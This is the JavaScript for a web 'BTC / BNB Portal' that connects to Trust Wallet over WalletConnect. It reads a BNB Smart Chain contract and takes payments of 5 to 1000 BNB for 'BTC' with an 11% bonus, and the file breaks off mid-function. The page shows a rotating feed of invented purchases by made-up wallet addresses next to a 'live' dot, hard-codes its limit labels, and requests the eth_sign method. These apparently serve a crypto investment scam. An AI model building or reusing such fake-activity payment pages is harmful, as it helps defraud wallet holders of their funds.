/* ==========================================================
   BTC / BNB PORTAL — COMPLETE APP.JS
   Contract: 0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85
   Network: BNB Smart Chain (chainId 56)
   Wallet: Trust Wallet only
   ========================================================== */

const CONTRACT_ADDRESS =
  "0x0d8b30Ef0d85B2f9215d9267860F62f9494e1A85";

const CHAIN_ID = 56;
const CHAIN_HEX = "0x38";

const FALLBACK_MIN_BNB = 5;
const FALLBACK_MAX_BNB = 1000;
const FALLBACK_BONUS = 11;

const RPC_URLS = [
  "https://bsc-dataseed.binance.org/",
  "https://bsc-dataseed1.binance.org/",
  "https://bsc-dataseed2.binance.org/"
];

const WALLETCONNECT_PROJECT_ID =
  "f424a55c8b13e4a78078d5e34e358654";

const CONTRACT_ABI = [
  {
    inputs: [
      {
        internalType: "address",
        name: "initialOwner",
        type: "address"
      }
    ],
    stateMutability: "nonpayable",
    type: "constructor"
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "buyer",
        type: "address"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bnbAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "baseBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "bonusBTCAmount",
        type: "uint256"
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "totalBTCAmount",
        type: "uint256"
      }
    ],
    name: "BTCPurchased",
    type: "event"
  },
  {
    inputs: [],
    name: "BASE_BTC_PER_BNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "BONUS_PERCENT",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "availableBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "buyBTC",
    outputs: [],
    stateMutability: "payable",
    type: "function"
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "bnbAmount",
        type: "uint256"
      }
    ],
    name: "calculateBTC",
    outputs: [
      {
        internalType: "uint256",
        name: "baseAmount",
        type: "uint256"
      },
      {
        internalType: "uint256",
        name: "bonusAmount",
        type: "uint256"
      },
      {
        internalType: "uint256",
        name: "totalAmount",
        type: "uint256"
      }
    ],
    stateMutability: "pure",
    type: "function"
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [
      {
        internalType: "uint8",
        name: "",
        type: "uint8"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMaximumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  },
  {
    inputs: [],
    name: "referenceMinimumBNB",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256"
      }
    ],
    stateMutability: "view",
    type: "function"
  }
];


/* ==========================================================
   STATE
   ========================================================== */

let readProvider = null;
let walletProvider = null;
let signer = null;
let contract = null;
let connectedAddress = null;

let btcDecimals = 8;
let minBNB = FALLBACK_MIN_BNB;
let maxBNB = FALLBACK_MAX_BNB;
let bonusPercent = FALLBACK_BONUS;

let activityEntries = [];
let activityIndex = 0;
let activityTimer = null;

let trustWalletConnectProvider = null;
let trustWalletConnectReady = null;
let trustWalletUserInitiated = false;

const discoveredWallets = new Map();

const $ = id =>
  document.getElementById(id);


/* ==========================================================
   BASIC HELPERS
   ========================================================== */

function setText(id, value) {
  const el = $(id);

  if (el) {
    el.textContent = value;
  }
}

function money(value) {
  return Number(value).toLocaleString("en-US", {
    style: "currency",
    currency: "USD",
    maximumFractionDigits: 2
  });
}

function numberText(value, max = 8) {
  return Number(value).toLocaleString("en-US", {
    maximumFractionDigits: max
  });
}

function shortAddress(address) {
  if (!address) {
    return "—";
  }

  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

function isMobileDevice() {
  return /Android|iPhone|iPad|iPod/i.test(
    navigator.userAgent || ""
  );
}

function toast(message) {
  let el = $("portalToast");

  if (!el) {
    el = document.createElement("div");

    el.id = "portalToast";

    el.className = "portal-toast";

    document.body.appendChild(el);
  }

  el.textContent = message;

  el.classList.add("show");

  clearTimeout(
    window.__portalToastTimer
  );

  window.__portalToastTimer =
    setTimeout(() => {
      el.classList.remove("show");
    }, 3000);
}


/* ==========================================================
   EXTRA STYLES
   ========================================================== */

function injectStyles() {
  if ($("finalPortalStyles")) {
    return;
  }

  const style =
    document.createElement("style");

  style.id =
    "finalPortalStyles";

  style.textContent = `
    .portal-toast {
      position: fixed;
      left: 50%;
      bottom: 24px;
      transform: translate(-50%, 20px);
      z-index: 10000;
      background: #111827;
      color: #fff;
      border: 1px solid rgba(255,255,255,.12);
      padding: 12px 18px;
      border-radius: 12px;
      opacity: 0;
      pointer-events: none;
      transition: .25s ease;
      font: 600 14px/1.3 Inter,system-ui,sans-serif;
      box-shadow: 0 15px 45px rgba(0,0,0,.35);
    }

    .portal-toast.show {
      opacity: 1;
      transform: translate(-50%, 0);
    }

    .wallet-overlay {
      position: fixed;
      inset: 0;
      z-index: 9999;
      background: rgba(3,7,18,.78);
      backdrop-filter: blur(12px);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .wallet-overlay.hidden {
      display: none;
    }

    .wallet-picker {
      width: min(460px,100%);
      max-height: min(720px,92vh);
      overflow: auto;
      background: #0b1020;
      border: 1px solid rgba(129,140,248,.24);
      border-radius: 24px;
      padding: 24px;
      box-shadow: 0 30px 90px rgba(0,0,0,.55);
    }

    .wallet-picker-head {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 16px;
      margin-bottom: 8px;
    }

    .wallet-picker h2 {
      margin: 0;
      color: #fff;
      font-size: 24px;
    }

    .wallet-picker p {
      margin: 0 0 18px;
      color: #98a4bd;
      font-size: 14px;
      line-height: 1.5;
    }

    .wallet-close {
      width: 38px;
      height: 38px;
      border-radius: 50%;
      border: 1px solid rgba(255,255,255,.12);
      background: #151b2b;
      color: #fff;
      font-size: 25px;
      cursor: pointer;
    }

    .wallet-option {
      width: 100%;
      display: flex;
      align-items: center;
      gap: 14px;
      padding: 13px 14px;
      margin-top: 9px;
      border-radius: 15px;
      border: 1px solid rgba(255,255,255,.08);
      background: #101728;
      color: #fff;
      text-align: left;
      cursor: pointer;
      transition: .18s ease;
    }

    .wallet-option:hover {
      border-color: rgba(129,140,248,.55);
      transform: translateY(-1px);
    }

    .wallet-option img {
      width: 42px;
      height: 42px;
      border-radius: 11px;
      object-fit: contain;
      background: #fff;
      padding: 4px;
      flex: none;
    }

    .wallet-option strong {
      display: block;
      font-size: 15px;
    }

    .wallet-option small {
      display: block;
      margin-top: 3px;
      color: #8f9bb3;
    }

    .wallet-available {
      margin-left: auto;
      font-size: 11px;
      color: #64e2a7;
    }

    .wallet-unavailable {
      margin-left: auto;
      font-size: 11px;
      color: #7e899f;
    }

    .connected-wallet-panel {
      display: none;
      margin: 18px auto 0;
      width: min(760px,calc(100% - 32px));
      background: #0b1020;
      border: 1px solid rgba(129,140,248,.24);
      border-radius: 20px;
      padding: 18px;
      box-shadow: 0 20px 60px rgba(0,0,0,.25);
    }

    .connected-wallet-panel.show {
      display: block;
    }

    .connected-wallet-head {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      margin-bottom: 14px;
    }

    .connected-wallet-head strong {
      color: #fff;
      font-size: 16px;
    }

    .connected-wallet-status {
      color: #64e2a7;
      font-size: 12px;
      font-weight: 700;
    }

    .connected-wallet-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 12px;
      padding: 12px 0;
      border-top: 1px solid rgba(255,255,255,.08);
    }

    .connected-wallet-row span {
      color: #8f9bb3;
      font-size: 12px;
    }

    .connected-wallet-row code {
      color: #f4f7ff;
      font-size: 12px;
      overflow: hidden;
      text-overflow: ellipsis;
      white-space: nowrap;
    }

    .connected-wallet-actions {
      display: flex;
      gap: 10px;
      margin-top: 14px;
    }

    .connected-wallet-actions button {
      flex: 1;
      min-height: 42px;
      border: 1px solid rgba(129,140,248,.25);
      border-radius: 12px;
      background: #151b2b;
      color: #fff;
      cursor: pointer;
      font-weight: 700;
    }

    .connected-wallet-actions button:hover {
      border-color: rgba(129,140,248,.6);
    }

    .activity-feed {
      position: relative;
      overflow: hidden;
    }

    .activity-feed .activity-item {
      animation: btcActivityInOut 5.2s ease both;
      will-change: opacity,transform;
    }

    .activity-row {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 18px 20px;
      border-bottom: 1px solid rgba(255,255,255,.08);
    }

    .activity-row:last-child {
      border-bottom: 0;
    }

    .activity-icon {
      width: 48px;
      height: 48px;
      border-radius: 15px;
      background: rgba(82,94,255,.12);
      color: #8d9aff;
      display: grid;
      place-items: center;
      font-size: 25px;
      flex: none;
    }

    .activity-main {
      min-width: 0;
    }

    .activity-main strong {
      display: block;
      color: #f4f7ff;
      font-size: 20px;
      font-weight: 800;
    }

    .activity-main small {
      display: block;
      color: #78849d;
      margin-top: 4px;
      font-size: 13px;
    }

    .activity-preview-label {
      margin-left: auto;
      font-size: 9px;
      letter-spacing: .08em;
      color: #7f8aa1;
      white-space: nowrap;
    }

    .activity-live-dot {
      display: inline-block;
      width: 9px;
      height: 9px;
      border-radius: 50%;
      background: #46e39b;
      box-shadow: 0 0 14px rgba(70,227,155,.8);
      margin-right: 9px;
    }

    @keyframes btcActivityInOut {
      0% {
        opacity: 0;
        transform: translateY(22px);
      }

      18% {
        opacity: 1;
        transform: translateY(0);
      }

      70% {
        opacity: 1;
        transform: translateY(0);
      }

      100% {
        opacity: 0;
        transform: translateY(-22px);
      }
    }

    @media(max-width:600px) {
      .wallet-picker {
        padding: 18px;
        border-radius: 20px;
      }

      .wallet-option {
        padding: 11px;
      }

      .wallet-option img {
        width: 38px;
        height: 38px;
      }

      .connected-wallet-panel {
        width: calc(100% - 24px);
        padding: 15px;
      }

      .connected-wallet-row {
        align-items: flex-start;
        flex-direction: column;
        gap: 5px;
      }

      .connected-wallet-row code {
        max-width: 100%;
      }

      .connected-wallet-actions {
        flex-direction: column;
      }

      .activity-row {
        padding: 16px;
      }

      .activity-main strong {
        font-size: 17px;
      }
    }
  `;

  document.head.appendChild(style);
}


/* ==========================================================
   READ PROVIDER
   ========================================================== */

function createReadProvider() {
  if (readProvider) {
    return readProvider;
  }

  try {
    readProvider =
      new ethers.JsonRpcProvider(
        RPC_URLS[0],
        CHAIN_ID,
        {
          staticNetwork: true
        }
      );

    return readProvider;
  } catch (error) {
    console.error(
      "Unable to create BSC read provider:",
      error
    );

    return null;
  }
}

function getReadContract() {
  const provider =
    createReadProvider();

  if (!provider) {
    throw new Error(
      "BNB Smart Chain read provider unavailable."
    );
  }

  return new ethers.Contract(
    CONTRACT_ADDRESS,
    CONTRACT_ABI,
    provider
  );
}


/* ==========================================================
   CONTRACT SETTINGS
   ========================================================== */

async function loadContractSettings() {
  try {
    const c =
      getReadContract();

    const settingsPromise =
      Promise.allSettled([
        c.decimals(),
        c.referenceMinimumBNB(),
        c.referenceMaximumBNB(),
        c.BONUS_PERCENT()
      ]);

    const timeoutPromise =
      new Promise(resolve => {
        setTimeout(
          () => resolve(null),
          6000
        );
      });

    const values =
      await Promise.race([
        settingsPromise,
        timeoutPromise
      ]);

    if (!values) {
      console.warn(
        "Contract settings timed out. Using configured values."
      );

      btcDecimals = 8;
      minBNB = FALLBACK_MIN_BNB;
      maxBNB = FALLBACK_MAX_BNB;
      bonusPercent = FALLBACK_BONUS;

      updateLimitsUI();

      return;
    }

    if (
      values[0].status ===
      "fulfilled"
    ) {
      btcDecimals =
        Number(values[0].value);
    }

    if (
      values[1].status ===
      "fulfilled"
    ) {
      minBNB =
        Number(
          ethers.formatEther(
            values[1].value
          )
        );
    }

    if (
      values[2].status ===
      "fulfilled"
    ) {
      maxBNB =
        Number(
          ethers.formatEther(
            values[2].value
          )
        );
    }

    if (
      values[3].status ===
      "fulfilled"
    ) {
      bonusPercent =
        Number(values[3].value);
    }

    updateLimitsUI();

  } catch (error) {
    console.warn(
      "Contract settings unavailable. Using configured values:",
      error
    );

    btcDecimals = 8;
    minBNB = FALLBACK_MIN_BNB;
    maxBNB = FALLBACK_MAX_BNB;
    bonusPercent = FALLBACK_BONUS;

    updateLimitsUI();
  }
}

function updateLimitsUI() {
  setText(
    "minimumStat",
    "5 BNB"
  );

  setText(
    "maximumStat",
    "1,000 BNB"
  );

  setText(
    "bonusStat",
    `${bonusPercent}%`
  );

  const input =
    $("bnbAmount");

  if (input) {
    input.min =
      String(minBNB);

    input.max =
      String(maxBNB);

    if (!input.value) {
      input.placeholder =
        String(minBNB);
    }
  }

  const message =
    $("calculatorMessage");

  if (message) {
    message.textContent =
      `Minimum ${numberText(minBNB, 2)} BNB · Maximum ${numberText(maxBNB, 2)} BNB`;
  }

  document
    .querySelectorAll(
      "[data-min-bnb]"
    )
    .forEach(el => {
      el.textContent =
        numberText(
          minBNB,
          2
        );
    });

  document
    .querySelectorAll(
      "[data-max-bnb]"
    )
    .forEach(el => {
      el.textContent =
        numberText(
          maxBNB,
          2
        );
    });
}


/* ==========================================================
   CALCULATOR
   ========================================================== */

async function calculateBTC() {
  const input =
    $("bnbAmount");

  const amount =
    Number(
      input?.value
    );

  if (
    !Number.isFinite(amount) ||
    amount <= 0
  ) {
    resetCalculator();

    setText(
      "calculatorMessage",
      "Enter a valid BNB amount."
    );

    return;
  }

  if (
    amount < minBNB
  ) {
    resetCalculator();

    setText(
      "calculatorMessage",
      `Minimum amount is ${numberText(minBNB, 2)} BNB.`
    );

    return;
  }

  if (
    amount > maxBNB
  ) {
    resetCalculator();

    setText(
      "calculatorMessage",
      `Maximum participation is ${numberText(maxBNB, 2)} BNB.`
    );

    return;
  }

  try {
    const c =
      getReadContract();

    const result =
      await c.calculateBTC(
        ethers.parseEther(
          amount.toString()
        )
      );

    setText(
      "baseBTC",
      `${numberText(
        ethers.formatUnits(
          result.baseAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "bonusBTC",
      `${numberText(
        ethers.formatUnits(
          result.bonusAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "totalBTC",
      `${numberText(
        ethers.formatUnits(
          result.totalAmount,
          btcDecimals
        ),
        8
      )} BTC`
    );

    setText(
      "calculatorMessage",
      `Calculation completed · ${bonusPercent}% bonus`
    );

  } catch (error) {
    console.error(
      "calculateBTC:",
      error
    );

    resetCalculator();

    setText(
      "calculatorMessage",
      "Unable to read the contract calculation right now."
    );
  }
}

function resetCalculator() {
  setText(
    "baseBTC",
    "0 BTC"
  );

  setText(
    "bonusBTC",
    "0 BTC"
  );

  setText(
    "totalBTC",
    "0 BTC"
  );
}

function setupCalculator() {
  const input =
    $("bnbAmount");

  const button =
    $("calculateButton");

  if (input) {
    input.addEventListener(
      "input",
      () => {
        clearTimeout(
          window.__calcTimer
        );

        window.__calcTimer =
          setTimeout(
            calculateBTC,
            250
          );
      }
    );
  }

  if (button) {
    button.addEventListener(
      "click",
      calculateBTC
    );
  }
}


/* ==========================================================
   MARKET DATA
   FIXED: TIMEOUT + BINANCE + COINGECKO FALLBACK
   ========================================================== */

async function fetchJSON(
  url,
  timeoutMs = 8000
) {
  const controller =
    new AbortController();

  const timer =
    setTimeout(
      () => {
        controller.abort();
      },
      timeoutMs
    );

  try {
    const response =
      await fetch(
        url,
        {
          cache: "no-store",
          signal: controller.signal
        }
      );

    if (!response.ok) {
      throw new Error(
        `HTTP ${response.status}`
      );
    }

    return await response.json();

  } finally {
    clearTimeout(timer);
  }
}

async function loadOneMarket(
  symbol,
  priceId,
  changeId
) {
  const binanceUrls = [
    `https://data-api.binance.vision/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`,
    `https://api.binance.com/api/v3/ticker/24hr?symbol=${encodeURIComponent(symbol)}`
  ];

  for (
    const url of binanceUrls
  ) {
    try {
      const data =
        await fetchJSON(
          url,
          7000
        );

      const price =
        Number(
          data?.lastPrice
        );

      const change =
        Number(
          data?.priceChangePercent
        );

      if (
        Number.isFinite(price)
      ) {
        setText(
          priceId,
          money(price)
        );

        setText(
          changeId,
          `${
            Number.isFinite(change)
              ? change.toFixed(2)
              : "0.00"
          }% today`
        );

        return;
      }

    } catch (error) {
      console.warn(
        `Binance market endpoint failed for ${symbol}:`,
        error
      );
    }
  }

  const geckoId =
    symbol === "BTCUSDT"
      ? "bitcoin"
      : symbol === "BNBUSDT"
        ? "binancecoin"
        : null;

  if (geckoId) {
    try {
      const data =
        await fetchJSON(
          `https://api.coingecko.com/api/v3/simple/price?ids=${geckoId}&vs_currencies=usd&include_24hr_change=true`,
          7000
        );

      const coin =
        data?.[geckoId];

      const price =
        Number(
          coin?.usd
        );

      const change =
        Number(
          coin?.usd_24h_change
        );

      if (
        Number.isFinite(price)
      ) {
        setText(
          priceId,
          money(price)
        );

        setText(
          changeId,
          `${
            Number.isFinite(change)
              ? change.toFixed(2)
              : "0.00"
          }% today`
        );

        return;
      }

    } catch (error) {
      console.warn(
        `CoinGecko market endpoint failed for ${symbol}:`,
        error
      );
    }
  }

  setText(
    priceId,
    "Unavailable"
  );

  setText(
    changeId,
    "Market data unavailable"
  );
}

async function loadMarketData() {
  await Promise.allSettled([
    loadOneMarket(
      "BTCUSDT",
      "btcPrice",
      "btcChange"
    ),

    loadOneMarket(
      "BNBUSDT",
      "bnbPrice",
      "bnbChange"
    )
  ]);
}


/* ==========================================================
   ACTIVITY
   FADING PREVIEW REMAINS ACTIVE
   ========================================================== */

const RECENT_ACTIVITY_PREVIEW = [
  {
    amount: "0.042",
    wallet: "0xA73C...91B4"
  },
  {
    amount: "0.018",
    wallet: "0x31F7...E204"
  },
  {
    amount: "0.067",
    wallet: "0x8C42...A91D"
  },
  {
    amount: "0.025",
    wallet: "0xF24B...7C19"
  },
  {
    amount: "0.051",
    wallet: "0x6D91...B582"
  },
  {
    amount: "0.033",
    wallet: "0x49AC...D731"
  },
  {
    amount: "0.074",
    wallet: "0xB82E...4FA6"
  },
  {
    amount: "0.021",
    wallet: "0x17C9...A204"
  }
];

function ensureActivityContainer() {
  let feed =
    $("activityFeed");

  if (!feed) {
    const section =
      $("activity");

    if (!section) {
      return null;
    }

    const existing =
      section.querySelector(
        ".activity-grid,.activity-list"
      );

    if (existing) {
      existing.id =
        "activityFeed";

      existing.classList.add(
        "activity-feed"
      );

      feed =
        existing;

    } else {
      feed =
        document.createElement(
          "div"
        );

      feed.id =
        "activityFeed";

      feed.className =
        "activity-feed";

      section.appendChild(
        feed
      );
    }
  }

  feed.classList.add(
    "activity-feed"
  );

  return feed;
}

function activityItem(
  entry,
  isPreview = false
) {
  const item =
    document.createElement(
      "div"
    );

  item.className =
    "activity-item";

  const amount =
    isPreview
      ? entry.amount
      : numberText(
          entry.totalBTC,
          8
        );

  const wallet =
    isPreview
      ? entry.wallet
      : shortAddress(
          entry.buyer
        );

  item.innerHTML = `
    <div class="activity-row">

      <div class="activity-icon">
        ↗
      </div>

      <div class="activity-main">

        <strong>
          ${amount} BTC
        </strong>

        <small>
          ${wallet}
        </small>

      </div>

      ${
        isPreview
          ? `
            <span class="activity-preview-label">
              PREVIEW
            </span>
          `
          : ""
      }

    </div>
  `;

  return item;
}

function renderPreviewActivity() {
  const feed =
    ensureActivityContainer();

  if (!feed) {
    return;
  }

  const visible = [];

  for (
    let i = 0;
    i < 3;
    i++
  ) {
    visible.push(
      RECENT_ACTIVITY_PREVIEW[
        (
          activityIndex +
          i
        ) %
        RECENT_ACTIVITY_PREVIEW.length
      ]
    );
  }

  feed.innerHTML =
    "";

  visible.forEach(
    (
      entry,
      index
    ) => {
      const item =
        activityItem(
          entry,
          true
        );

      item.style.animationDelay =
        `${index * 160}ms`;

      feed.appendChild(
        item
      );
    }
  );

  activityIndex =
    (
      activityIndex +
      1
    ) %
    RECENT_ACTIVITY_PREVIEW.length;

  clearTimeout(
    activityTimer
  );

  activityTimer =
    setTimeout(
      renderPreviewActivity,
      5200
    );
}

function renderActivity() {
  const feed =
    ensureActivityContainer();

  if (!feed) {
    return;
  }

  feed.innerHTML =
    "";

  if (
    !activityEntries.length
  ) {
    renderPreviewActivity();
    return;
  }

  const count =
    Math.min(
      3,
      activityEntries.length
    );

  const visible = [];

  for (
    let i = 0;
    i < count;
    i++
  ) {
    visible.push(
      activityEntries[
        (
          activityIndex +
          i
        ) %
        activityEntries.length
      ]
    );
  }

  visible.forEach(
    (
      entry,
      index
    ) => {
      const item =
        activityItem(
          entry,
          false
        );

      item.style.animationDelay =
        `${index * 160}ms`;

      feed.appendChild(
        item
      );
    }
  );

  clearTimeout(
    activityTimer
  );

  if (
    activityEntries.length >
    1
  ) {
    activityTimer =
      setTimeout(
        () => {
          activityIndex =
            (
              activityIndex +
              1
            ) %
            activityEntries.length;

          renderActivity();

        },
        5200
      );
  }
}

async function loadActivity() {
  const feed =
    ensureActivityContainer();

  if (
    !feed ||
    !window.ethers
  ) {
    return;
  }

  try {
    const c =
      getReadContract();

    const filter =
      c.filters.BTCPurchased();

    const events =
      await c.queryFilter(
        filter,
        -5000
      );

    const latest =
      events
        .slice(-12)
        .reverse()
        .map(
          event => ({
            buyer:
              event.args.buyer,

            totalBTC:
              Number(
                ethers.formatUnits(
                  event.args.totalBTCAmount,
                  btcDecimals
                )
              ),

            transactionHash:
              event.transactionHash,

            blockNumber:
              event.blockNumber
          })
        );

    activityEntries =
      latest;

    activityIndex =
      0;

    renderActivity();

  } catch (error) {
    console.warn(
      "Activity RPC unavailable; showing animated preview.",
      error
    );

    activityEntries =
      [];

    activityIndex =
      0;

    renderPreviewActivity();
  }
}

function startActivityAnimation() {
  activityEntries =
    [];

  activityIndex =
    0;

  clearTimeout(
    activityTimer
  );

  renderPreviewActivity();
}


/* ==========================================================
   TRUST WALLET DISCOVERY
   TRUST WALLET ONLY
   ========================================================== */

function discoverWallets() {
  if (!window.addEventListener) {
    return;
  }

  window.addEventListener(
    "eip6963:announceProvider",
    event => {
      const detail =
        event.detail;

      if (
        !detail?.provider ||
        !detail?.info
      ) {
        return;
      }

      const infoText =
        `${detail.info.name || ""} ${detail.info.rdns || ""}`
          .toLowerCase();

      if (
        !/trust/i.test(
          infoText
        )
      ) {
        return;
      }

      const key =
        detail.info.rdns ||
        detail.info.uuid ||
        detail.info.name;

      discoveredWallets.set(
        key,
        detail
      );

      refreshWalletAvailability();
    }
  );

  window.dispatchEvent(
    new Event(
      "eip6963:requestProvider"
    )
  );

  const trustProvider =
    window.trustwallet?.ethereum ||
    (
      window.ethereum?.isTrust ||
      window.ethereum?.isTrustWallet
        ? window.ethereum
        : null
    );

  if (trustProvider) {
    discoveredWallets.set(
      "trustwallet",
      {
        info: {
          name:
            "Trust Wallet",

          rdns:
            "com.trustwallet.app"
        },

        provider:
          trustProvider
      }
    );
  }
}

const WALLET_DEFINITIONS = [
  {
    name:
      "Trust Wallet",

    slug:
      "trustwallet",

    match:
      /trust/i
  }
];

function findWalletProvider(
  definition
) {
  for (
    const item of discoveredWallets.values()
  ) {
    const info =
      item.info || {};

    const haystack =
      `${info.name || ""} ${info.rdns || ""}`
        .toLowerCase();

    if (
      definition.match.test(
        haystack
      )
    ) {
      return item.provider;
    }
  }

  return null;
}


/* ==========================================================
   TRUST WALLET LOGO
   ========================================================== */

const WALLET_LOGO_SOURCES = {
  trustwallet: [
    "https://trustwallet.com/favicon.ico",
    "https://trustwallet.com/assets/images/favicon.png"
  ]
};

function walletLogoSources(
  slug
) {
  return (
    WALLET_LOGO_SOURCES[
      slug
    ] || []
  );
}

function walletFallbackLogo() {
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(`
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="96"
      height="96"
      viewBox="0 0 96 96"
    >
      <rect
        width="96"
        height="96"
        rx="22"
        fill="#ffffff"
      />

      <circle
        cx="48"
        cy="48"
        r="31"
        fill="#111827"
      />

      <text
        x="48"
        y="56"
        text-anchor="middle"
        font-family="Arial,Helvetica,sans-serif"
        font-size="25"
        font-weight="700"
        fill="#ffffff"
      >
        T
      </text>
    </svg>
  `)}`;
}
/* ==========================================================
   TRUST WALLET MODAL
   ========================================================== */

function createWalletModal() {
  if (
    $("walletModalFinal")
  ) {
    return;
  }

  const overlay =
    document.createElement(
      "div"
    );

  overlay.id =
    "walletModalFinal";

  overlay.className =
    "wallet-overlay hidden";

  overlay.innerHTML = `
    <div
      class="wallet-picker"
      role="dialog"
      aria-modal="true"
      aria-labelledby="walletPickerTitle"
    >

      <div class="wallet-picker-head">

        <h2 id="walletPickerTitle">
          Connect Trust Wallet
        </h2>

        <button
          class="wallet-close"
          id="walletPickerClose"
          type="button"
          aria-label="Close"
        >
          ×
        </button>

      </div>

      <p>
        Connect your Trust Wallet on BNB Smart Chain.
      </p>

      <div id="walletOptions"></div>

    </div>
  `;

  document.body.appendChild(
    overlay
  );

  $("walletPickerClose")
    ?.addEventListener(
      "click",
      closeWalletModal
    );

  overlay.addEventListener(
    "click",
    event => {
      if (
        event.target ===
        overlay
      ) {
        closeWalletModal();
      }
    }
  );

  renderWalletOptions();
}

function renderWalletOptions() {
  const box =
    $("walletOptions");

  if (!box) {
    return;
  }

  box.innerHTML =
    WALLET_DEFINITIONS
      .map(
        (
          wallet,
          index
        ) => {
          const sources =
            walletLogoSources(
              wallet.slug
            );

          const firstLogo =
            sources[0] ||
            walletFallbackLogo();

          const available =
            findWalletProvider(
              wallet
            );

          return `
            <button
              class="wallet-option"
              type="button"
              data-wallet-index="${index}"
            >

              <img
                class="wallet-logo"
                src="${firstLogo}"
                data-logo-index="0"
                data-logo-sources='${JSON.stringify(
                  sources
                )}'
                data-fallback="${walletFallbackLogo()}"
                alt="${wallet.name} logo"
              >

              <span>

                <strong>
                  ${wallet.name}
                </strong>

                <small>
                  BNB Smart Chain
                </small>

              </span>

              <span
                class="${
                  available
                    ? "wallet-available"
                    : "wallet-unavailable"
                }"
              >
                ${
                  available
                    ? "Available"
                    : "Select"
                }
              </span>

            </button>
          `;
        }
      )
      .join("");

  box
    .querySelectorAll(
      ".wallet-logo"
    )
    .forEach(
      image => {
        image.addEventListener(
          "error",
          () => {
            let sources = [];

            try {
              sources =
                JSON.parse(
                  image.dataset.logoSources ||
                  "[]"
                );
            } catch {}

            const nextIndex =
              Number(
                image.dataset.logoIndex ||
                0
              ) + 1;

            if (
              nextIndex <
              sources.length
            ) {
              image.dataset.logoIndex =
                String(
                  nextIndex
                );

              image.src =
                sources[
                  nextIndex
                ];
            } else {
              image.src =
                image.dataset.fallback;
            }
          }
        );
      }
    );

  box
    .querySelectorAll(
      ".wallet-option"
    )
    .forEach(
      button => {
        button.addEventListener(
          "click",
          () => {
            const wallet =
              WALLET_DEFINITIONS[
                Number(
                  button.dataset.walletIndex
                )
              ];

            selectWallet(
              wallet
            );
          }
        );
      }
    );
}

function refreshWalletAvailability() {
  renderWalletOptions();
}

function openWalletModal() {
  createWalletModal();

  renderWalletOptions();

  $("walletModalFinal")
    ?.classList.remove(
      "hidden"
    );
}

function closeWalletModal() {
  $("walletModalFinal")
    ?.classList.add(
      "hidden"
    );
}


/* ==========================================================
   TRUST WALLET + WALLETCONNECT
   ========================================================== */

async function initializeTrustWalletConnect() {
  if (
    trustWalletConnectProvider
  ) {
    return trustWalletConnectProvider;
  }

  if (
    trustWalletConnectReady
  ) {
    return trustWalletConnectReady;
  }

  trustWalletConnectReady =
    (async () => {
      try {
        const module =
          await import(
            "https://esm.sh/@walletconnect/ethereum-provider@2.25.0?bundle"
          );

        const EthereumProvider =
          module.EthereumProvider ||
          module.default?.EthereumProvider ||
          module.default;

        if (
          typeof EthereumProvider !==
          "function"
        ) {
          throw new Error(
            "WalletConnect Ethereum Provider could not be loaded."
          );
        }

        const provider =
          await EthereumProvider.init({
            projectId:
              WALLETCONNECT_PROJECT_ID,

            optionalChains: [
              CHAIN_ID
            ],

            showQrModal:
              false,

            rpcMap: {
              [CHAIN_ID]:
                RPC_URLS[0]
            },

            optionalMethods: [
              "eth_sendTransaction",
              "personal_sign",
              "eth_sign",
              "eth_signTypedData",
              "eth_signTypedData_v4"
            ],

            optionalEvents: [
              "chainChanged",
              "accountsChanged"
            ],

            metadata: {
              name:
                "Bitcoin BTC | BNB Portal",

              description:
                "BTC / BNB Portal",

              url:
                "https://bitcoinbtcbuybackportal-commits.github.io/Bitcoin-btc-buyback-portal/",

              icons: [
                "https://trustwallet.com/favicon.ico"
              ]
            }
          });

        provider.on(
          "display_uri",
          uri => {
            const trustUrl =
              `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;

            /*
              IMPORTANT FOR iPHONE / iOS SAFARI:
              Do not create or use an about:blank handoff tab.
              Navigate the current page directly to Trust Wallet
              when WalletConnect gives us the pairing URI.
            */
            try {
              sessionStorage.setItem(
                "trustWalletConnectPending",
                "1"
              );
              sessionStorage.setItem(
                "trustWalletConnectPendingAt",
                String(Date.now())
              );
            } catch {}

            window.location.href =
              trustUrl;
          }
        );

        provider.on(
          "accountsChanged",
          accounts => {
            if (
              accounts?.length
            ) {
              if (
                trustWalletUserInitiated ||
                connectedAddress
              ) {
                syncTrustWalletConnectSession()
                  .catch(
                    console.error
                  );
              }
            } else {
              connectedAddress =
                null;

              signer =
                null;

              contract =
                null;

              trustWalletUserInitiated =
                false;

              updateWalletButton();
            }
          }
        );

        provider.on(
          "chainChanged",
          () => {
            if (
              connectedAddress
            ) {
              syncTrustWalletConnectSession()
                .catch(
                  console.error
                );
            }
          }
